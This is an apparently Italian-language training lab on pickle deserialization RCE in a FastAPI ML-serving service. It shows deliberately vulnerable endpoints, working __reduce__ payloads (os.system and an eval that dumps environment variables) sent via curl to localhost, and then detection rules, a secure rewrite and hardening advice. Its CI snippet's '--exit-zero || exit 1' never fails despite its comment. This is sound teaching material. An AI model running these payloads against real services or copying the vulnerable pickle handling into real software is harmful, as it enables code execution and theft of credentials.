# Scenario 02 — Remote Code Execution via Deserializzazione Pickle

> **Modulo di riferimento:** [18-sicurezza.md](../18-sicurezza.md), [07-error-handling-e-logging.md](../07-error-handling-e-logging.md), [13-rest-api.md](../13-rest-api.md)
> **Tempo stimato:** 2-3 ore
> **Livello:** avanzato
> **Prerequisiti:** completamento moduli 07, 13, 18; conoscenza base serializzazione Python
> **Ultimo aggiornamento:** 2026-05-23
> **Classificazione OWASP:** A08:2021 — Software and Data Integrity Failures

---

## Contesto

Un team ha sviluppato un servizio interno di ML serving. Il servizio espone
un'API REST che accetta modelli pre-addestrati e dati di input serializzati
per eseguire inference on-demand.

Architettura:

```
Data Scientist -> API Gateway -> ML Serving (FastAPI)
                                   |
                  POST /predict    |-> pickle.loads(payload)
                  POST /model      |-> pickle.loads(model_bytes)
                                   |-> model.predict(data)
```

Il servizio e esposto solo sulla rete interna, ma il team di sicurezza
ha identificato che un contractor ha accesso alla VPN e potrebbe inviare
payload malevoli. L'API non valida il contenuto dei dati serializzati.

**Ambiente:** lab isolato autorizzato per test di sicurezza. Nessun sistema
di produzione coinvolto.

---

## Sintomi osservati

1. L'API accetta qualsiasi dato serializzato con `pickle.loads()` senza validazione
2. Nessun log strutturato delle operazioni di deserializzazione
3. Il servizio gira come `root` nel container (nessun hardening)
4. Nessuna policy di sandboxing o seccomp applicata
5. Il code review ha evidenziato `pickle.loads` in 3 endpoint

---

## Dati iniziali

### Codice sorgente del servizio vulnerabile

```python
"""ML Serving API — versione VULNERABILE."""

import pickle
import base64
from typing import Any

from fastapi import FastAPI, HTTPException
from pydantic import BaseModel

app = FastAPI(title="ML Serving API")

# Storage in-memory per modelli caricati
_models: dict[str, Any] = {}


class PredictRequest(BaseModel):
    model_name: str
    data: str           # base64-encoded pickle


class ModelUpload(BaseModel):
    name: str
    model_data: str     # base64-encoded pickle del modello


@app.post("/api/v1/model")
async def upload_model(req: ModelUpload):
    """Carica un modello ML serializzato."""
    try:
        raw = base64.b64decode(req.model_data)
        # VULNERABILE: deserializza qualsiasi payload pickle
        model = pickle.loads(raw)
        _models[req.name] = model
        return {"status": "loaded", "name": req.name}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.post("/api/v1/predict")
async def predict(req: PredictRequest):
    """Esegue inference con dati pickle."""
    if req.model_name not in _models:
        raise HTTPException(status_code=404, detail="Model not found")
    try:
        raw = base64.b64decode(req.data)
        # VULNERABILE: deserializza input utente
        data = pickle.loads(raw)
        model = _models[req.model_name]
        result = model.predict(data)
        return {"prediction": result}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/v1/batch")
async def batch_predict(model_name: str, items: list[str]):
    """Batch prediction con lista di payload pickle."""
    if model_name not in _models:
        raise HTTPException(status_code=404, detail="Model not found")
    results = []
    for item in items:
        raw = base64.b64decode(item)
        # VULNERABILE: loop di deserializzazione non validata
        data = pickle.loads(raw)
        results.append(_models[model_name].predict(data))
    return {"predictions": results}
```

### Risultato bandit (scan statico)

```
$ bandit -r ml_serving/ -f json

Run started: 2026-05-22 10:15:32

Test results:
>> Issue: [B301:blacklist] Pickle and modules that wrap it can be made
   to execute arbitrary commands. Consider alternatives such as JSON.
   Severity: High   Confidence: High
   CWE: CWE-502 (Deserialization of Untrusted Data)
   Location: ml_serving/app.py:31:18
   More Info: https://bandit.readthedocs.io/en/1.8.0/blacklists/B301.html
      30          raw = base64.b64decode(req.model_data)
      31          model = pickle.loads(raw)
      32          _models[req.name] = model

>> Issue: [B301:blacklist] Pickle and modules that wrap it can be made
   to execute arbitrary commands.
   Severity: High   Confidence: High
   CWE: CWE-502
   Location: ml_serving/app.py:44:15
      43          raw = base64.b64decode(req.data)
      44          data = pickle.loads(raw)

>> Issue: [B301:blacklist] Pickle and modules that wrap it can be made
   to execute arbitrary commands.
   Severity: High   Confidence: High
   CWE: CWE-502
   Location: ml_serving/app.py:57:15
      56          raw = base64.b64decode(item)
      57          data = pickle.loads(raw)

Files scanned: 1
Issues found: 3 (Severity: 3 High)
```

---

## Domande guidate

### D1 — Il meccanismo di exploit

Come funziona `__reduce__` nel protocollo pickle? Perche consente
esecuzione di codice arbitrario?

<details>
<summary>Suggerimento</summary>

`__reduce__` ritorna una tupla `(callable, args)`. Durante `pickle.loads`,
Python chiama `callable(*args)` per ricostruire l'oggetto.
Se `callable` e `os.system` e `args` e `("comando_malevolo",)`,
il comando viene eseguito con i privilegi del processo.

</details>

### D2 — Perimetro dell'attacco

Oltre a `pickle`, quali altri moduli Python hanno lo stesso
problema di deserializzazione insicura?

<details>
<summary>Suggerimento</summary>

- `shelve` (usa pickle internamente)
- `marshal` (parzialmente, per bytecode)
- `yaml.load()` senza `Loader=SafeLoader` (YAML tags arbitrari)
- `jsonpickle` (serializza oggetti Python in JSON, ma deserializza classi)
- `dill` (estende pickle, stessi rischi)

</details>

### D3 — Mitigazione parziale

`pickle.Unpickler` supporta il metodo `find_class()` per limitare
le classi deserializzabili. E sufficiente come difesa?

<details>
<summary>Suggerimento</summary>

E una difesa parziale (allowlist). Ma:
- La superficie di attacco e enorme: qualsiasi classe permessa puo
  avere side-effect inaspettati
- Bypass noti esistono tramite catene di gadget
- Non protegge da nuove classi aggiunte alla allowlist senza review
- Best practice: non usare pickle per dati non fidati, punto.

</details>

### D4 — Impatto

Se l'attaccante ottiene RCE nel container che gira come root,
quali azioni puo compiere? Elenca almeno 5 scenari.

<details>
<summary>Suggerimento</summary>

1. Leggere variabili d'ambiente (credenziali DB, API key)
2. Accedere alla rete interna (lateral movement)
3. Modificare i modelli ML per restituire predizioni errate
4. Esfiltrare dati di training (potenzialmente PII)
5. Installare backdoor persistente
6. Container escape (se kernel vulnerabile)
7. Criptomining

</details>

---

## Dimostrazione exploit (ambiente lab)

**ATTENZIONE:** Questa sezione e esclusivamente per ambiente lab isolato
e autorizzato. Non eseguire su sistemi di produzione.

### Step 1 — Crafting del payload RCE

```python
"""Costruzione di un payload pickle malevolo per lab di sicurezza."""

import pickle
import base64
import os


class MaliciousPayload:
    """
    __reduce__ viene invocato da pickle.loads() per ricostruire l'oggetto.
    Invece di ricostruire un oggetto legittimo, esegue un comando.
    """

    def __reduce__(self):
        # Ritorna (callable, args) — pickle invochera callable(*args)
        # In un attacco reale: reverse shell, download di malware, etc.
        # Nel lab: comando innocuo per dimostrare l'esecuzione
        return (os.system, ("id > /tmp/pwned.txt",))


# Serializzare il payload
payload = pickle.dumps(MaliciousPayload())
payload_b64 = base64.b64encode(payload).decode()

print(f"Payload base64 ({len(payload)} bytes raw):")
print(payload_b64)
```

### Step 2 — Invio del payload all'API

```bash
# Inviare il payload malevolo all'endpoint /model
curl -s -X POST http://localhost:8000/api/v1/model \
  -H "Content-Type: application/json" \
  -d '{
    "name": "legit_model",
    "model_data": "gASVMAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBVpZCA+IC90bXAvcHduZWQudHh0lIWUUpQu"
  }'

# Verificare l'esecuzione
cat /tmp/pwned.txt
# Output: uid=0(root) gid=0(root) groups=0(root)
```

### Step 3 — Payload piu sofisticato con catena di gadget

```python
"""Payload che esfiltra variabili d'ambiente — lab only."""

import pickle
import base64


class ExfilEnv:
    def __reduce__(self):
        # Catena: importa subprocess, esegue comando, cattura output
        return (
            eval,
            ("__import__('subprocess').check_output("
             "['env'], text=True)",),
        )


payload = pickle.dumps(ExfilEnv())
print(base64.b64encode(payload).decode())
```

### Step 4 — Analisi del protocollo pickle (disassembly)

```python
import pickletools
import pickle
import os


class Demo:
    def __reduce__(self):
        return (os.system, ("id",))


data = pickle.dumps(Demo())
pickletools.dis(data)
```

Output:

```
    0: \x80 PROTO      4
    2: \x95 FRAME      42
   11: \x8c SHORT_BINUNICODE 'posix'
   18: \x8c SHORT_BINUNICODE 'system'
   26: \x93 STACK_GLOBAL
   27: \x8c SHORT_BINUNICODE 'id'
   31: \x85 TUPLE1
   32: R    REDUCE
   33: .    STOP
```

`STACK_GLOBAL` carica `posix.system`, `REDUCE` lo invoca con `('id',)`.
Qualsiasi funzione Python accessibile puo essere invocata in questo modo.

---

## Rilevamento

### Pattern di code review da cercare

```python
# PERICOLOSO — qualsiasi variante di queste e un red flag
pickle.loads(data)
pickle.load(file)
pickle.Unpickler(file).load()

# Moduli correlati con lo stesso rischio
import shelve          # usa pickle internamente
import dill            # superset di pickle
import joblib          # joblib.load() usa pickle
import torch           # torch.load() usa pickle
import cloudpickle     # pickle esteso

# Anche queste sono pericolose
yaml.load(data)        # senza Loader=SafeLoader
yaml.unsafe_load(data)
marshal.loads(data)
```

### Scan automatizzato con bandit

```bash
# Regole specifiche per deserializzazione insicura
bandit -r . -t B301,B302,B303,B506 -f json -o bandit-report.json

# B301: pickle
# B302: marshal
# B303: md5 (correlato, non deserializzazione)
# B506: yaml unsafe load
```

### Regola semgrep custom

```yaml
# .semgrep/rules/no-pickle-untrusted.yaml
rules:
  - id: no-pickle-loads
    patterns:
      - pattern: pickle.loads(...)
    message: >
      pickle.loads() deserializza codice arbitrario.
      Usare JSON, Pydantic, o MessagePack per dati non fidati.
      Riferimento: CWE-502, OWASP A08:2021
    severity: ERROR
    languages: [python]
    metadata:
      cwe: ["CWE-502"]
      owasp: ["A08:2021"]
      confidence: HIGH

  - id: no-torch-load-untrusted
    patterns:
      - pattern: torch.load(...)
      - pattern-not: torch.load(..., weights_only=True, ...)
    message: >
      torch.load() usa pickle internamente.
      Usare weights_only=True o safetensors per modelli non fidati.
    severity: ERROR
    languages: [python]
```

---

## Soluzione completa

### app_secure.py

```python
"""ML Serving API — versione SICURA."""

from __future__ import annotations

import base64
import hashlib
import json
import logging
from datetime import datetime, timezone
from typing import Any

import numpy as np
from fastapi import FastAPI, HTTPException, Request
from pydantic import BaseModel, field_validator

logger = logging.getLogger(__name__)

app = FastAPI(title="ML Serving API (Secure)")

_models: dict[str, Any] = {}

# Allowlist di formati accettati
ALLOWED_MODEL_FORMATS = frozenset({"onnx", "safetensors", "joblib_safe"})
MAX_PAYLOAD_SIZE = 50 * 1024 * 1024  # 50 MB


# ---- Request models con validazione Pydantic ----

class PredictRequest(BaseModel):
    model_name: str
    data: dict[str, Any]    # JSON strutturato, NON pickle

    @field_validator("model_name")
    @classmethod
    def validate_model_name(cls, v: str) -> str:
        if not v.isalnum() or len(v) > 64:
            raise ValueError("model_name deve essere alfanumerico, max 64 char")
        return v

    @field_validator("data")
    @classmethod
    def validate_data(cls, v: dict) -> dict:
        # Validazione strutturale dei dati di input
        serialized = json.dumps(v)
        if len(serialized) > 10 * 1024 * 1024:  # 10 MB
            raise ValueError("data payload troppo grande")
        return v


class ModelUpload(BaseModel):
    name: str
    format: str             # "onnx", "safetensors", "joblib_safe"
    model_data: str         # base64 del modello in formato sicuro
    checksum_sha256: str    # hash per verifica integrita

    @field_validator("format")
    @classmethod
    def validate_format(cls, v: str) -> str:
        if v not in ALLOWED_MODEL_FORMATS:
            raise ValueError(f"Formato non supportato. Ammessi: {ALLOWED_MODEL_FORMATS}")
        return v

    @field_validator("name")
    @classmethod
    def validate_name(cls, v: str) -> str:
        if not v.isalnum() or len(v) > 64:
            raise ValueError("name deve essere alfanumerico, max 64 char")
        return v


# ---- Loader sicuri per formato ----

def _load_onnx(raw: bytes) -> Any:
    """Carica modello ONNX (formato non eseguibile)."""
    import onnxruntime as ort
    import tempfile
    import os

    # ONNX Runtime carica il grafo senza eseguire codice arbitrario
    with tempfile.NamedTemporaryFile(suffix=".onnx", delete=False) as f:
        f.write(raw)
        tmp_path = f.name
    try:
        session = ort.InferenceSession(tmp_path)
        return session
    finally:
        os.unlink(tmp_path)


def _load_safetensors(raw: bytes) -> dict[str, np.ndarray]:
    """Carica pesi da safetensors (formato sicuro, no code execution)."""
    from safetensors.numpy import load
    return load(raw)


def _load_model(fmt: str, raw: bytes) -> Any:
    """Dispatcher per formati sicuri."""
    loaders = {
        "onnx": _load_onnx,
        "safetensors": _load_safetensors,
    }
    loader = loaders.get(fmt)
    if loader is None:
        raise ValueError(f"Loader non disponibile per formato: {fmt}")
    return loader(raw)


# ---- Middleware di logging ----

@app.middleware("http")
async def log_requests(request: Request, call_next):
    start = datetime.now(timezone.utc)
    response = await call_next(request)
    duration_ms = (datetime.now(timezone.utc) - start).total_seconds() * 1000
    logger.info(
        "request_completed",
        extra={
            "method": request.method,
            "path": request.url.path,
            "status": response.status_code,
            "duration_ms": round(duration_ms, 2),
            "client": request.client.host if request.client else "unknown",
            "timestamp": start.isoformat(),
        },
    )
    return response


# ---- Endpoint sicuri ----

@app.post("/api/v1/model")
async def upload_model(req: ModelUpload):
    """Carica un modello in formato sicuro (ONNX, safetensors)."""
    raw = base64.b64decode(req.model_data)

    # Verifica integrita
    computed_hash = hashlib.sha256(raw).hexdigest()
    if computed_hash != req.checksum_sha256:
        logger.warning(
            "model_checksum_mismatch",
            extra={"name": req.name, "expected": req.checksum_sha256, "got": computed_hash},
        )
        raise HTTPException(status_code=400, detail="Checksum SHA-256 non corrispondente")

    # Verifica dimensione
    if len(raw) > MAX_PAYLOAD_SIZE:
        raise HTTPException(status_code=413, detail=f"Modello troppo grande (max {MAX_PAYLOAD_SIZE} bytes)")

    try:
        model = _load_model(req.format, raw)
    except Exception:
        logger.exception("model_load_failed", extra={"name": req.name, "format": req.format})
        raise HTTPException(status_code=400, detail="Impossibile caricare il modello")

    _models[req.name] = model
    logger.info("model_loaded", extra={"name": req.name, "format": req.format, "size": len(raw)})
    return {"status": "loaded", "name": req.name, "format": req.format}


@app.post("/api/v1/predict")
async def predict(req: PredictRequest):
    """Inference con dati JSON strutturati (niente pickle)."""
    if req.model_name not in _models:
        raise HTTPException(status_code=404, detail="Model not found")

    model = _models[req.model_name]
    try:
        # Convertire dict -> numpy array per ONNX
        input_array = np.array(req.data.get("values", []), dtype=np.float32)
        # ONNX Runtime inference
        input_name = model.get_inputs()[0].name
        result = model.run(None, {input_name: input_array.reshape(1, -1)})
        return {"prediction": result[0].tolist()}
    except Exception:
        logger.exception("prediction_failed", extra={"model": req.model_name})
        raise HTTPException(status_code=500, detail="Errore durante la predizione")
```

### Differenze chiave

| Aspetto | Prima (vulnerabile) | Dopo (sicuro) |
|---------|---------------------|---------------|
| Formato dati | `pickle.loads()` | JSON + Pydantic validation |
| Formato modello | Pickle arbitrario | ONNX / safetensors (non eseguibili) |
| Validazione input | Nessuna | Pydantic validators, size limits |
| Integrita | Nessuna | SHA-256 checksum |
| Logging | `print()` basico | Structured logging con context |
| Errori | `str(e)` esposto | Messaggi generici, dettagli nei log |
| Privilegi container | root | Da configurare come non-root |

### Hardening del container

```dockerfile
# Dockerfile sicuro
FROM python:3.12-slim AS base

# Utente non-root
RUN groupadd -r mlserve && useradd -r -g mlserve -s /bin/false mlserve

WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

# Drop privilegi
USER mlserve

# Seccomp e capabilities da configurare nel deployment
# (vedi security context Kubernetes sotto)

CMD ["uvicorn", "app_secure:app", "--host", "0.0.0.0", "--port", "8000"]
```

```yaml
# Kubernetes securityContext
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  capabilities:
    drop: ["ALL"]
  seccompProfile:
    type: RuntimeDefault
```

---

## Difesa in profondita

### Livello 1 — Eliminare pickle per dati non fidati

```python
# PRIMA (pericoloso)
data = pickle.loads(raw_bytes)

# DOPO — Opzione A: JSON + Pydantic
data = PredictRequest.model_validate_json(raw_bytes)

# DOPO — Opzione B: MessagePack (piu compatto, no code execution)
import msgpack
data = msgpack.unpackb(raw_bytes, raw=False)

# DOPO — Opzione C: protobuf (schema-defined, no code execution)
data = MyMessage()
data.ParseFromString(raw_bytes)
```

### Livello 2 — Unpickler restrittivo (se pickle e inevitabile)

```python
"""
RestrictedUnpickler: allowlist esplicita di classi.
ATTENZIONE: difesa parziale. Preferire sempre l'eliminazione di pickle.
"""

import io
import pickle


ALLOWED_CLASSES = frozenset({
    ("numpy", "ndarray"),
    ("numpy", "dtype"),
    ("numpy.core.multiarray", "_reconstruct"),
    ("builtins", "slice"),
})


class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module: str, name: str) -> type:
        key = (module, name)
        if key not in ALLOWED_CLASSES:
            raise pickle.UnpicklingError(
                f"Classe non autorizzata: {module}.{name}"
            )
        return super().find_class(module, name)


def safe_loads(data: bytes) -> object:
    """Deserializza con allowlist. Preferire JSON/Pydantic quando possibile."""
    return RestrictedUnpickler(io.BytesIO(data)).load()


# Test
import numpy as np

arr = np.array([1.0, 2.0, 3.0])
serialized = pickle.dumps(arr)

# Questo funziona: numpy.ndarray e nella allowlist
result = safe_loads(serialized)
assert (result == arr).all()

# Questo viene bloccato
import os


class Evil:
    def __reduce__(self):
        return (os.system, ("id",))

try:
    safe_loads(pickle.dumps(Evil()))
except pickle.UnpicklingError as e:
    print(f"BLOCCATO: {e}")
    # BLOCCATO: Classe non autorizzata: posix.system
```

### Livello 3 — Sandboxing dell'esecuzione

```python
"""
Eseguire deserializzazione in un processo isolato con risorse limitate.
Solo se pickle e assolutamente inevitabile (legacy, migrazione graduale).
"""

import multiprocessing
import resource
import signal
from typing import Any


def _sandboxed_deserialize(data: bytes, result_queue: multiprocessing.Queue) -> None:
    """Processo figlio con limiti di risorse."""
    # Limitare memoria a 256 MB
    resource.setrlimit(resource.RLIMIT_AS, (256 * 1024 * 1024, 256 * 1024 * 1024))
    # Limitare tempo CPU a 5 secondi
    resource.setrlimit(resource.RLIMIT_CPU, (5, 5))
    # Limitare file descriptor
    resource.setrlimit(resource.RLIMIT_NOFILE, (16, 16))

    try:
        import pickle
        obj = pickle.loads(data)
        result_queue.put(("ok", obj))
    except Exception as e:
        result_queue.put(("error", str(e)))


def deserialize_sandboxed(data: bytes, timeout: float = 10.0) -> Any:
    """Deserializza in processo isolato con timeout."""
    result_queue: multiprocessing.Queue = multiprocessing.Queue()
    proc = multiprocessing.Process(
        target=_sandboxed_deserialize,
        args=(data, result_queue),
    )
    proc.start()
    proc.join(timeout=timeout)

    if proc.is_alive():
        proc.kill()
        proc.join()
        raise TimeoutError("Deserializzazione interrotta per timeout")

    if result_queue.empty():
        raise RuntimeError("Processo sandbox terminato senza risultato")

    status, value = result_queue.get_nowait()
    if status == "error":
        raise RuntimeError(f"Errore in sandbox: {value}")
    return value
```

### Livello 4 — Input validation e rate limiting

```python
from fastapi import Request
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)


@app.post("/api/v1/predict")
@limiter.limit("100/minute")
async def predict(req: PredictRequest, request: Request):
    # Validazione gia gestita da Pydantic (vedi sopra)
    ...
```

---

## Lezioni apprese

### 1. Pickle non e un formato di serializzazione: e un formato di esecuzione

`pickle.loads()` e funzionalmente equivalente a `eval()`. Il protocollo
pickle e un linguaggio di stack machine che puo invocare qualsiasi callable
Python. Non esiste modo di renderlo "sicuro" per dati non fidati.

Regola: **mai deserializzare pickle da fonti non fidate**. Nemmeno con
`RestrictedUnpickler` (difesa parziale, bypass noti).

### 2. Alternative sicure per ogni caso d'uso

| Caso d'uso | Pericoloso | Sicuro |
|------------|-----------|--------|
| API data exchange | `pickle` | JSON, MessagePack, protobuf |
| ML model weights | `pickle`, `torch.load()` | safetensors, ONNX |
| Config/settings | `yaml.load()` | `yaml.safe_load()`, TOML, JSON |
| Object serialization | `shelve`, `dill` | Pydantic `.model_dump_json()` |
| Caching | `pickle` + Redis | JSON + Redis, msgpack + Redis |
| Inter-process comms | `pickle` via socket | `multiprocessing` managed types, protobuf |

### 3. Defense in depth: non basta un singolo controllo

```
Layer 1: Eliminare pickle (formato sicuro)              <-- primario
Layer 2: Input validation (Pydantic, size limits)       <-- sempre
Layer 3: Integrity check (SHA-256, firma digitale)      <-- per artifacts
Layer 4: Sandbox (processo isolato, rlimit)             <-- se legacy
Layer 5: Container hardening (non-root, seccomp)        <-- infrastruttura
Layer 6: Network segmentation (zero-trust)              <-- architettura
Layer 7: Monitoring (structured logging, alerting)      <-- visibilita
```

### 4. SAST e un prerequisito, non un optional

`bandit` avrebbe individuato tutti e 3 gli endpoint vulnerabili con
la regola B301. Integrare nel CI/CD:

```yaml
# .github/workflows/security.yml
- name: Bandit SAST
  run: |
    pip install bandit
    bandit -r src/ -f json -o bandit-report.json
    # Fail su severity HIGH
    bandit -r src/ -ll --exit-zero || exit 1
```

### 5. OWASP A08:2021 — Software and Data Integrity Failures

Questa categoria copre:

- Deserializzazione insicura (CWE-502)
- Mancata verifica di integrita di software e dati
- Pipeline CI/CD insicure
- Auto-update senza firma

La deserializzazione pickle e l'esempio canonico in Python.

---

## Riferimenti

- [Modulo 18 — Sicurezza](../18-sicurezza.md): pickle, bandit, supply chain
- [Modulo 07 — Error handling e logging](../07-error-handling-e-logging.md): structured logging, exception handling
- [Modulo 13 — REST API](../13-rest-api.md): Pydantic validation, FastAPI security
- OWASP A08:2021 — Software and Data Integrity Failures
- CWE-502 — Deserialization of Untrusted Data
- Python docs: `pickle` — Warning sulla sicurezza
- `safetensors` — Formato sicuro per pesi ML (huggingface/safetensors)
- `bandit` docs: B301, B302 rules
